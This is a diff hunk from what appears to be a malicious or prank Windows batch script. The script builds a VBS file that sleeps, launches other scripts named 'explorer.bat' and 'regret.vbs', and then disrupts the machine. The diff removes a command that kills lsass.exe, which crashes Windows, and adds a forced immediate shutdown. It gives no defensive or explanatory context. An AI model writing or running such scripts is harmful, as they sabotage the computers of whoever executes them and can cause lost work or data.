@@ -215,8 +215,8 @@ echo wscript.sleep 600000 >> shutdown.vbs
 echo WshShell.Run "explorer.bat" >> shutdown.vbs
 echo wscript.sleep 5000 >> shutdown.vbs
 echo WshShell.Run "regret.vbs" >> shutdown.vbs
-echo wscript.sleep 60000 >> shutdown.vbs
-echo WshShell.Run "taskkill /f /im lsass.exe" >> shutdown.vbs
+echo wscript.sleep 10000 >> shutdown.vbs
+echo WshShell.Run "shutdown -s -t 0" >> shutdown.vbs
 start shutdown.vbs
 goto ChangeUrRealName
 
